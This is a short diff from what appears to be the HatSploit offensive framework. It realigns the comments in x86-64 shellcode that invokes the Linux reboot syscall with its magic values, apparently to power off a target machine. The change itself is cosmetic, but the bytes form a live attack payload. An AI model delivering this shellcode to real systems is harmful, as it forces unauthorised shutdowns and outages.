@@ -31,6 +31,6 @@ class HatSploitPayload(Payload):
             b"\xba\xdc\xfe\x21\x43"  # mov    $0x4321fedc,%edx
             b"\xbe\x69\x19\x12\x28"  # mov    $0x28121969,%esi
             b"\xbf\xad\xde\xe1\xfe"  # mov    $0xfee1dead,%edi
-            b"\xb0\xa9"  # mov    $0xa9,%al
-            b"\x0f\x05"  # syscall
+            b"\xb0\xa9"              # mov    $0xa9,%al
+            b"\x0f\x05"              # syscall
         )
